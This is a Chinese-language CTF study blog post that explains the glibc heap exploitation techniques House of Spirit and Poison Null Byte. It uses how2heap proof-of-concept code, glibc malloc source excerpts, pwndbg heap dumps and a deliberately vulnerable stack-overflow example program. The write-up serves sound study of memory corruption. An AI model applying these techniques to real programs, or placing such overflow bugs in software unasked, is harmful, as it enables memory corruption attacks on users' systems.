---
layout:     post
title:      "「how2heap」how2heap之堆溢出利用(二)"
subtitle:   "how2heap之 house of <?>系列"
date:       2019-08-20 20:54:00
header-img:   "img/home-bg-o.jpg"
author:     "许大仙"
catalog: true
tags:
    - CTF
---

2005年，一篇名为"The Malloc Maleficarum"的文章提出了5种攻击堆的方式：

```html
The House of Prime
The House of Mind
The House of Force
The House of Lore
The House of Spirit
The House of Chaos
```

2005年的大佬文章啊！今天才学，惭愧。

接下来继续跟着how2heap学堆溢出的攻击姿势吧！

## House of Spirit——将heap劫持到stack

在2009年，Phrack 66期上也刊登了一篇名为"Malloc Des-Maleficarum"的文章，对前面提到的这几种技术进行了进一步的分析，在这其中，House of Spirit是与fastbin相关。

#### 攻击思路综述

House of spirit 的主要**利用fastbin**，其基本思路如下:

1. 用户能够通过这个漏洞控制一个free的指针*P*
2. 在**可控位置(.bss,stack,heap)**上构造一个fake fastbin chunk
3. 将*P*修改为fake fastbin chunk 的chunk address，并且将其free到*Fastbins[i]*中去
4. 下次malloc一个相应大小的fastbin时就能够返回fake fastbin chunk的位置，实现write anything anywhere

简单来说就是，通过在可控的位置【一般对于非连续的可控位置】构造一个fake chunk，free这个伪造chunk，使得内存allocator错误分配到我们的fake chunk，进而达到write anything anywhere的效果。

#### 攻击原理

house of spirit <u>通常用来配合栈溢出使用</u>,通常场景是，栈溢出无法覆盖到的返回地址的位置 ，而恰好栈中有一个即将被 free 的堆指针【栈中的某个内存位置作为堆指针的存储位置】。我们通过在栈上 fake 一个fastbin chunk ，接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。

##### 进入正题

首先通过`malloc(1)`初始化堆，触发堆区的构建。

```c++
fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
malloc(1);
```

```c++
unsigned long long *a;
[...]
a = &fake_chunks[2];
fprintf(stderr, "Freeing the overwritten pointer.\n");
free(a);
```

观察到源码中有`free(a)`，真实情况下需要把栈上的a修改成为伪造的chunk mem地址【通过栈溢出可能实现不到返回地址的覆盖，但是可能可以做到a指针存储位置的覆盖，从而触发house of spirit攻击，达到返回地址的覆盖】，但是本题中内部直接写了a的覆盖：`a = &fake_chunks[2]`，故接下来只需要伪造chunk。

```c++
unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
fake_chunks[1] = 0x40; // this is the size
fake_chunks[9] = 0x1234; // nextsize
```

我们在栈上fake_chunks数组中来伪造两个chunk【为什么是两个？此后会讲述】，以fake_chunks[0]为第一个堆块的chunk地址。

首先需要明确对于chunk而言，要求malloc返回的mem地址必须是16字节对齐的（64-bits系统下），因此对于栈上的变量位置fake_chunks的起始位置【chunk头地址】必须是16字节对齐，这样偏移prev_size字段和size字段以后得到的mem地址也才是16字节对齐的。

>__attribute 其实是个编译器指令，告诉编译器声明的特性，或者让编译器进行更多的错误检查和高级优化。
>
>**attribute** 可以设置函数属性（Function Attribute）、变量属性（Variable Attribute）和类型属性（Type Attribute）。
>
>比如\_\_attribute\_\_ ((aligned (16)))就是设置变量fake_chunks的起始地址需要16字节对齐。

首先设置`fake_chunk[0]`为第一个堆块的起始地址，然后设置其size域`fake_chunks[1]`为0x40【处于fastbin范围，<= 128 on x64】。

**那标志位的处理呢?**

在how2heap中描述：

>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.

即对于fastbin chunk的<u>free操作底层实现会忽略掉对`PREV_INUSE `位【恰好是最低有效位lsb】的检查，因此无所谓是0还是1</u>【不过默认在fastbin中都设置为1，避免合并，只是说free不会对齐进行检查，因为正常上对于fastbin chunk这个位一直都是1】。但是<u>` IS_MMAPPED`和`NON_MAIN_ARENA`必须设置为0</u>【即非mapped+主分配区，具体原因下面源码分析的时候会讲】。

因此标志位全为0也没事，故size域直接放入大小0x40即可。

第一个chunk伪造完了，把直接`a = &fake_chunks[2];free(a);`还是不行，**还必须要考虑next_size**【第二个堆块的size域】。

这时候就要涉及到free的源码了，对free的调用将会被一个包装函数，名为public_fREe处理:

```c++
void public_fRE(Void_t* mem) //mem是调用free的参数【也就是待free的chunk的mem地址】
{
    mstate ar_ptr;
    mchunkptr p; // mem相应的chunk
    ...
    p = mem2chunk(mem);
    if (chunk_is_mmapped(p)) //对mmaped的chunk进行特殊处理，即调用munmap
    {
        munmap_chunk(p);
        return;
    }
    ...
    ar_ptr = arena_for_chunk(p);
    ...
    _int_free(ar_ptr, mem);
}
```

在这种情况下，mem是之前已经被溢出并使得指向fake chunk的一个值，然后通过`p = mem2chunk(mem);`被转换为fake chunk相应的chunk头指针，然后被传进`arena_for_chunk(p)`来找到相应的arena，**为了避免对于mmap chunk的特殊处理，以及为了得到一个有用的arena【此时初始化堆以后有用的分配区只有main_area】，fake chunk头的size域的IS\_MMAPPED和NON\_MAIN\_ARENA位必须为0**。<u>为了做到这个，攻击者只需要确认fake 的size是8的倍数就可以了【即后三个标志位为0】</u>。以上确实没有看出free对`PREV_SIZE`的检查。

这样的话，_int_free函数就会被调用了：

```c++
void _int_free(mstate av, Void_t* mem)//av为该chunk所在area
{
    mchunkptr p; // mem相应的chunk
    INTERNAL_SIZE_T size; //size大小
    mfastbinptr* fb; //联系的fast bin
    ...
    p = mem2chunk(mem);
    size = chunksize(p);
    ...
    if ((unsigned long)(size) <= (unsigned long)(av->max_fast))
    {
        if (chunk_at_offset(p, size)->size <= 2 * SIZE_SZ
            || __builtin_expect(chunksize(chunk_at_offset(p, size))
                                            >= av->system_mem, 0))
        {
            errstr = "free(): invalid next size (fast)";
            goto errout;
        }
        ...
        fb = &(av->fastbins[fastbin_index(size)]);
        ...
        p->fd = *fb;
        *fb = p;
    }
}
```

这里是free对于使用house of spirit所需要了解的全部代码了。攻击者控制的mem值再次被转换为chunk头指针`p`，然后通过`size = chunksize(p)`将fake的size值被提取出来。

因为size已经是攻击者控制的了，只需要保证这个值小于av->max_fast，才能进入fastbin free相关的代码就。

>\#ifndef DEFAULT_MXFAST
>\#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)
>\#endif
>/*
><u>Set value of max_fast.</u>
>Use impossibly small value if 0.
>Precondition: there are no existing fastbin chunks.
>Setting the value clears fastchunk bit but preserves noncontiguous bit.
>*/

上面的宏 **DEFAULT_MXFAST 定义了默认的 fast bins 中最大的 chunk 大小**， 对于 SIZE_SZ
为 4B 的平台， 最大 chunk 为 64B，对于 SIZE_SZ 为 8B 的平台，最大 chunk 为 128B。 

因此，这里的av->max_fast的默认值为128B，因此fake chunk的size必须控制在128B以内。

最后fake chunk的布局需要考虑的是如何通过nextsize正确性的检测。

```c++
#define chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s))) 
//宏 chunk_at_offset(p, s)将 p+s 的地址强制看作一个 chunk。

if (chunk_at_offset(p, size)->size <= 2 * SIZE_SZ || __builtin_expect(chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0))
```

这里通过`chunk_at_offset(p, size)`，计算p+size，得到下一个chunk的头部地址，并获得下一个chunk的size字段，检查要求下一个物理相邻的chunk的size必须在[2\*SIZE_SZ,av->system_mem]，也就是要**保证nextchunk的size是一个合法值**，因为2\*SIZE_SZ是chunk的最小大小【chunk头+0B的usersize】，而`av->system_mem`记录了当前分配区已经分配的内存大小【也就是所在的main_area的大小，显然一个chunk不可能比所在area要大】。

正如how2heap程序运行中所提示的： 

> The chunk.size of the  \*next\* fake region has to be sane. That is > 2\*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.

但是第二个chunk的chunk头地址在哪里呢？由于是通过`chunk_at_offset(p, size)`来确定下一个chunk的chunk头地址的，因此p+size=&fake_chunks[0]+0x40=>&fake_chunks[8]，故可以确定下一个chunk的chunk头地址为&fake_chunks[8]，则nextsize字段对应fake_chunks[9]。

> 注意是unsigned long long类型的fake_chunks，故fake_chunks[i]和fake_chunks[i+1]相差8

故这里还需要对`fake_chunks[9] = 0x1234; // nextsize`进行设置，所以一开始要考虑在`unsigned long long fake_chunks[10]`中装下两个chunk，并且第二个chunk的mem地址也必须是16字节对齐的。【所以前面的size域选择0x40，一方面是为了fake_chunks[10]足够装下两个chunk，一方面是64-bits要求chunk的size字段16字节对齐（所以后三位为0），一方面为了让16字节对齐的p+0x40还是16字节对齐，从而next chunk的地址也是16字节对齐，<u>另一方面在于攻击最后为`malloc(0x30)`获取栈上伪造chunk，因为在64-bit平台上, 0x30~0x38大小的malloc，都会返回0x40的chunk，故这里的伪造才会被最后的malloc分配到】。</u>

但是这里虽然对nextsize的合理性有要求，但是却没有检查对齐，所以设置0x1234是ok的。

故伪造的chunk如下所示：

![fake chunk2布局](/img/how2heap/houseofspirit1.png)

伪造完成，只需要通过栈溢出或者bss段溢出修改free的指针以指向fake chunk1的用户mem地址`&fake_chunk[2]`，即可绕过free的检查机制，成功free一个伪造chunk到fastbin中。

```c++
a = &fake_chunks[2];
free(a);
fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
```

#### 攻击debug演示

**为什么初始化堆?**

由于在之后调用free(a)之前，都没有真实的堆分配，如果不调用`malloc(1)`初始化堆，连主分配区都没有，free的时候根本获得不了area【`arena_for_chunk(p)`】，肯定会crash。所以要初始化堆，以绕过，此后才可以正常free。

![fake chunk2布局](/img/how2heap/houseofspirit2.png)

然后进行一系列伪造chunk。

![fake chunk2布局](/img/how2heap/houseofspirit3.png)

控制栈上的指针a，设置为伪造chunk的mem地址，进行free操作。

![fake chunk2布局](/img/how2heap/houseofspirit4.png)

成功将栈上的伪造chunk放入fastbin。

![fake chunk2布局](/img/how2heap/houseofspirit5.png)

攻击成功，通过malloc，获得栈上的chunk，可以“合法地”对chunk的user size字段进行读写，达到攻击目的。

![fake chunk2布局](/img/how2heap/houseofspirit6.png)

#### 攻击注意点

##### 攻击内存布局要求

对于栈上的house_of_spirit攻击而言，因为fake chunk的大小必须要足够大才能包裹住目标【目标指的是函数指针等目标，比如包裹住返回地址】，从而才可以对目标进行修改。

所以nextchunk的size的地址必须高于目标【栈是向低地址增长的】。为了能够使得fake chunk被放进fastbin，nextsize一正确性检验必须被处理一下，这就意味着必须存在另外一个攻击者可控的值在高于目标的地址出现。

![攻击布局](/img/how2heap/houseofspirit7.png)

如果满足了这样一个内存布局，那么这个结构的地址将会被放进fastbin里。只要_int_malloc被调用，那么这个准备被返回的fake chunk就是有效的。只要这种情况发生了，那么操纵重写目标就非常简单了。

##### 攻击效果

house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的【上图橙色区域】。

<u>最简单的利用方式就是可以**将heap劫持到栈中**，覆盖返回地址。</u>

##### 攻击缺点

该技术的缺点是**需要对栈地址进行泄漏**，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要**满足对齐的要求**等。

它需要满足的条件有:

1. 溢出或其他漏洞，用于覆盖free的变量*P*
2. 用户能够控制该这个空闲块即*fake chunk*的大小，空闲块的大小rounded下一个次malloc的大小
3. 用户还需要能够控制*fake chunk*的高端地址，从而保证next_size bypass检查
4. 之后还存在malloc，最好能够控制malloc分配的大小。

##### 例题

回顾一下开头提到的基本思路：

1. 用户能够通过这个漏洞控制一个free的指针*P*
2. 在**可控位置(.bss,stack,heap)**上构造一个fake fastbin chunk
3. 将*P*修改为fake fastbin chunk 的chunk address，并且将其free到*Fastbins[i]*中去
4. 下次malloc一个相应大小的fastbin时就能够返回fake fastbin chunk的位置，实现write anything anywhere

看下面的小例子：

```c++
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>

int main(){
    void *p=malloc(0x20);
    char buf[8];
    read(0,buf,100); //栈溢出
    printf("stack address:%p",&buf);
    free(p);
    malloc(0x20);
}
```

上述程序即满足利用house-of-spirit的条件，存在一个可以溢出控制的指针*p*通过printf打印出了栈地址，我们可以通过在stack地址中布置fake chunk，将*p*修改为栈中的fake_chunk地址，从而再次malloc时将堆劫持到stack中。

- pwnable.tw 上的 spirited_away

#### 参考链接

- [浅析Linux堆溢出之fastbin](https://www.freebuf.com/news/88660.html)
- [Horse of spirit from ret2forever](https://tac1t0rnx.space/2018/02/14/horse-of-spirit/)

- [针对house of spirit的malloc源码分析](https://blog.csdn.net/qq_29343201/article/details/59477082)
- [house_of_spirit from QRZ's Blog](https://qrzbing.cn/2019/07/08/how2heap-2/#解释)
- [how2heap(下) 安全客](https://www.anquanke.com/post/id/86809)
- [how2heap from 先知社区](https://xz.aliyun.com/t/2582#toc-6)

## Posion NULL byte

最近忙着小学期和保研的事情，好久没更了。发现对heap的学习，应该尽快从对技术的单纯学习转到实战中，应用上还需要多锻炼。

#### 攻击思路概述

Poison null byte 是一种利用off-by-null实现的堆漏洞利用技术，它的**基本思想是通过one-by-null覆盖next chunk的SIZE【使得SIZE字段变小且标志位更改】，构造fake chunk利用unlink，最终构造Chunk overlap。**

- 由于溢出了一个字节，因此会将SIZE变小，比如0xabcd会变成0xab00【仍然满足对齐】
- 而对于chunk而言，物理相邻的chunk是通过prev_size字段和size字段来链接的。因此修改了一个chunk的size字段，会影响下一个物理响铃的chunk的位置

它是<u>Shrink freed chunk的加强版</u>，能够**bypass libc unlink中对的nextchunk的prev_size与chunk的size的检查**

#### 攻击原理

首先我们分配了三个chunk`a`，`b`，`c`，大小分别为0x100，0x200，0x100。

```c++
a = (uint8_t*) malloc(0x100);
int real_a_size = malloc_usable_size(a);//得到chunka的size字段的值，即为0x108【真实可用的大小，加上padding，不包括chunk头】
//it may be more than 0x100 because of rounding
//由于要加上chunk头以及16B对其，最终的size一定不是0x100，而是(0x100+0x08)align 0x10=0x110
//如果本身的size字段的最低字节就是0x00，那么这个攻击就没有意义了
b = (uint8_t*) malloc(0x200);
c = (uint8_t*) malloc(0x100);
```

接下来为了避免`chunkc`和` top chunk`产生合并，则分配了一个`barrier`作为屏障，官方解释如下【至于为什么会产生合并，还有待细究】：

```c++
barrier =  malloc(0x100);
fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
"The barrier is not strictly necessary, but makes things less confusing\n", barrier);
```

当前内存的分配情况如下：

![chunk分布](/img/how2heap/poison1.png)

##### 攻击开始

接下来，是正式伪造chunk的时候了。

我们最终要达成的目的**是在一段已经被free的chunk中夹着一个malloc chunk**。

以chunkb作为攻击的目标区域，利用chunk a进行off by null。

```c++
//由于在unlink中存在对size==prev_size(next_chunk) 的检查，因此需要对unlink的chunk的下一个chunk的prev_size进行伪造
fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
//在对a进行一个null byte溢出以后，会修改到chunk b的size字段和标志位
//如果先进行溢出，可能chunk b的prev_in_use标志位会受到影响【因为chunka实际是in use，溢出后被改成空闲状态】
//因此先free b，再进行溢出。

//伪造chunk‘c’的prev_size字段
//分析可知在chunka单字节null溢出后，b的size字段由0x211变为0x200，那么对于heap而言，chunk b的下一个chunk的起始地址，就应该是chunkb的chunk头地址+0x200=0x603110+0x200=0x603310的位置【新chunk c的位置】
//那么此后malloc b1会触发对chunk b的解链【unlink（b-0x10），用于切割这个chunk来分配b1】，这时候会检查其size字段是否和prev_size(next_chunk) 一致，因此我们需要在新chunk c的prev_size字段写入0x200，以绕过chunkb’size==chunk c‘prev_size 的检查，即*(size_t*)(b-0x10+0x200)=*(size_t*)(b+0x1f0)=0x200;
// we set this location to 0x200 since 0x200 == (0x211 & 0xff00) which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x1f0) = 0x200;
//此后查看heap可以看到只剩下三个chunk了。新的chunk c的情况为prev_size = 0x200, size = 0x0, fd = 0x210【原来chunk c的头地址】, bk = 0x110

// ！！这个技术对于一个free chunk的size字段被覆写十分有效。
	free(b);
	
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"，这里是单字节溢出到chunk b的size字段了。因为这个溢出，使得chunk c的头地址变为低了0x10。

	// This malloc will result in a call to unlink on the chunk where b was.
	b1 = malloc(0x100); //这个malloc会触发对chunk b的解链，而unlink过程中存在新增的check如下：
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.【对应的是对chunk b的check】
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P = b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200

```

###### 伪造过程【debug视角】

1.执行`*(size_t*)(b+0x1f0) = 0x200;`

```assembly
pwndbg> x/160xg 0x603110
0x603110:	0x0000000000000000	0x0000000000000211  #<-- chunk b
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
[...]
0x6032f0:	0x0000000000000000	0x0000000000000000
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000000	0x0000000000000000   #b+0x1f0 = 0x603310
#通过*(size_t*)(b+0x1f0) = 0x200;修改为：
#0x603310:	0x0000000000000200	0x0000000000000000   
0x603320:	0x0000000000000000	0x0000000000000111   #<-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
[...]
0x603410:	0x0000000000000000	0x0000000000000000
0x603420:	0x0000000000000000	0x0000000000000000
0x603430:	0x0000000000000000	0x0000000000000111    #<-- barrier
0x603440:	0x0000000000000000	0x0000000000000000
0x603450:	0x0000000000000000	0x0000000000000000
[...]
0x603520:	0x0000000000000000	0x0000000000000000
0x603530:	0x0000000000000000	0x0000000000000000
0x603540:	0x0000000000000000	0x0000000000020ac1    #<-- top chunk
0x603550:	0x0000000000000000	0x0000000000000000 
0x603560:	0x0000000000000000	0x0000000000000000
[...]
pwndbg> print b+0x1f0
$1 = (uint8_t *) 0x603310 ""
```

2.`free(b)`，此后chunk b会被放到unsorted bin中，此时heap的情况如下：

```assembly
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE { #chunk b
  prev_size = 0x0, 
  size = 0x211, 
  fd = 0x7ffff7dd1b78 <main_arena+88>,  #指向small bin对应表项的头【环境变量or线程变量】
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603320 {   #注意对比此时的chunk c位置和off by null后的chunk c位置
  prev_size = 0x210,  #prev_size字段为chunk b的大小
  size = 0x110,  #并且chunk c中prev_in_use标志位改为0【标识chunk b已经free】
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {  
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE { 
  prev_size = 0x0, 
  size = 0x20ac1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin #此时unsorted bin中有一个free chunk b
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603110 ◂— 0x7ffff7dd1b78 
smallbins
empty
largebins
empty
```

3.`a[real_a_size] = 0;`以后，heap的情况如下：

```assembly
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 {
  prev_size = 0x0, 
  size = 0x200,  #可以看到chunk b的size字段由0x211变为0x200
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603310 {  #注意到chunk c的起始地址变换了！【因为chunkc的起始地址是由chunk b的size字段定位的】
  prev_size = 0x200, #此时size（chunk b） = prev_size(chunk c) = 0x200
  size = 0x0, 
  fd = 0x210, 
  bk = 0x110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603110 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty

```

4.接下来执行`b1 = malloc(0x100);`，由于chunk b的大小是0x200，small bins中并没有和0x100大小对应的chunk，因此会触发解链chunk b，对其进行切割得到0x100的chunk b1，剩下的作为last remainder chunk。详细过程如下：

如果对应大小的chunk在fast bins和small bins中分配失败，那么接下来：

- ptmalloc 首先会遍历 fast bins 中的 chunk， 将相邻的 chunk 进行合并，并链接到 unsorted bin 中。
- 然后遍历 unsorted bin 中的 chunk【此时只有一个本来就在unsorted bin中的chunk b】，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小>=需要分配的大小，这种情况下就直接将该 chunk 进行切割【先unlink下来再split】。
- 剩余部分作为一个新的 chunk 加入到 unsorted bin 中。
  - 如果剩余部分 chunk 属于 small bins，将分配区的 last remainder chunk 设置为剩余部分构成
    的 chunk； 
  - 如果剩余部分 chunk 属于 large bins，将剩余部分 chunk 的 chunk size 链表指针设
    置为 NULL，因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零。
- 分配结束。

#####    攻击效果

```c++
//接下来就分配chunk b1，实际得到的chunk b1头地址其实就是原来chunk b的头地址
b1 = malloc(0x100);//实际占用0x110
//此时heap的情况会相应变换，得到一个0xf0大小的剩余chunk【0x200-0x110=0xf0】
```

```assembly
0x603000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {  #chunk b1
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x7ffff7dd1d68 <main_arena+584>, 
  bk = 0x7ffff7dd1d68 <main_arena+584>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603220 PREV_INUSE {   #剩余的chunk
  prev_size = 0x0, 
  size = 0xf1, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603310 {     #<- 新chunkc
  prev_size = 0xf0,   #在0x603310【新chunk c处】更新prev_size字段
  size = 0x0, 
  fd = 0x210,    #原来的chunk c的头部的prev_size并没有被更新，保持0x210
  bk = 0x110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin   #<-此时只有一个空闲chunk 0x603220，未来将会分配给b2
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603220 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty
```

接下来分配一个chunk b2，以这个chunk作为我们的目标victim：

```c++
// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
b2 = malloc(0x80); //chunk b2的头地址为0x603220，实际返回用户地址为0x603230，大小为0x90，切割剩下的chunk为0xf0-0x90 = 0x60
memset(b2,'B',0x80);  //对b2写入0x80
```

通过off by null，我们达到的**攻击效果就是对于早前`c = (uint8_t*) malloc(0x100);`得到的chunk c的prev_size字段【0x210】并不真正和前一个物理相邻的chunk的size字段一致，如果此后free(c)，向前合并时会认为有0x210B的chunk需要合并**。

###### 思考点

回想之前为什么需要先`free(b)`，再进行`a[real_a_size] = 0;`

- 其目的就在于让之后的chunk c记录好原始的free chunk b的状态，即chunk c' prev_in_use = 0且chunk c'prev_size = 0x210。
- 之后off by null 溢出后，只会修改了新chunk c认为的free chunk b的状态，而保留了chunk c记录的原始free chunk b的状态。

此时heap中的情况如下：

![chunk分布](/img/how2heap/poison2.png)

注意：由于这里size=0，因此没有下一个物理相邻的chunk的显示【barrier和top chunk都被隐藏了】

##### 攻击利用

```c++
fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
//接下来我们free(b1)和free(c)【这里的chunk c是原chunk c】
//由于对c而言，prev_in_use = 0，故会触发向前合并。
//合并的大小为prev_size字段制定的大小，即合并0x210的chunk大小
free(b1);
free(c);
//合并后的chunk为原chunkb和原chunkc合并后的大小。即0x210+0x110 = 0x320
//起始地址为原chunk b的首地址，此时可以通过size字段找到之前隐藏的barrier和top chunk 
```

此时heap的状态如下：

```assembly
pwndbg> heap        
0x603000 PREV_INUSE {   
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {    #<-  合并后的chunk【chunk b+chunk c】
  prev_size = 0x0, 
  size = 0x321, 
  fd = 0x6032b0, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603430 {        #<-  barrier chunk
  prev_size = 0x320, 
  size = 0x110, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE { #<- top chunk
  prev_size = 0x0, 
  size = 0x20ac1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin      #<- 0x603110为合并后的chunk，0x6032b0为之前剩余的chunk
all: 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603110 ◂— 0x6032b0
smallbins
empty
largebins
empty
```

现在分配一个0x300大小的chunk d，会覆盖住chunk b2【写了一堆‘B’】,发生overlapping。

```c++
d = malloc(0x300);
memset(d,'D',0x300);  //现在对d写入‘D’
//由于chunk b2和chunk d存在overlapping，读取b2会得到‘D’
fprintf(stderr, "New b2 content:\n%s\n",b2);
/*
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
*/
```

###### debug内存情况变化

1.分配chunk d以后，bins中只剩下【并且从unsorted bin中移动到small bins中】一个剩余chunk。

![chunk分布](/img/how2heap/poison4.png)

2.接下来对chunk d写入‘D’，读取b2得到输出'DDDDD.....‘

![chunk分布](/img/how2heap/poison3.png)

##### 产生攻击的原因

由于free chunk b后，a溢出对chunkb的size字段的改写，使得chunk b物理相邻的下一个chunk的chunk头地址被提前到b+0x1f0。此后分配b1和b2的时候，pre_size也会一直在(b+0x1f0)处更新。

而在最后free(c)的时候，检查的是c的pre_size位，而因为最开始的null byte溢出，导致这块区域的值一直没被更新，一直是b最开始的大小 0x210 。

而在free的过程中就会认为前面0x210个字节都是空闲的，于是就错误地进行了合并，然而glibc忽略了中间还有个可怜的b2【并没有被free】。

再 `malloc` 一块大于 b1 大小的 chunk【eg：chunk d->0x300】，使 **b2 与 b1 相互重叠。**

##### barrier的作用

如果没有barrier，其实也是一样的。只是free c的时候还会造成向后合并到top chunk中，即top chunk的chunk头指针为原chunk b的位置。

#### 参考链接

- [Poison null byte from Ret2Forever](https://tac1t0rnx.space/2018/01/24/poison-null-byte/)
- [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)
- [Null Byte Poisoning - The Magic Byte](https://0x00sec.org/t/null-byte-poisoning-the-magic-byte/3874)